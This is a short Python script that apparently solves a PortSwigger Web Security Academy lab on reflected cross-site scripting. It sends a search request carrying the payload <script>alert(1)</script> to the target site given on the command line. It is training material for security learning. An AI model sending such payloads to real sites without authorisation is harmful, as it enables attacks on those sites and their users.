"""
https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

search_url = f'https://{site}/?search=<script>alert(1)</script>'
resp = s.get(search_url)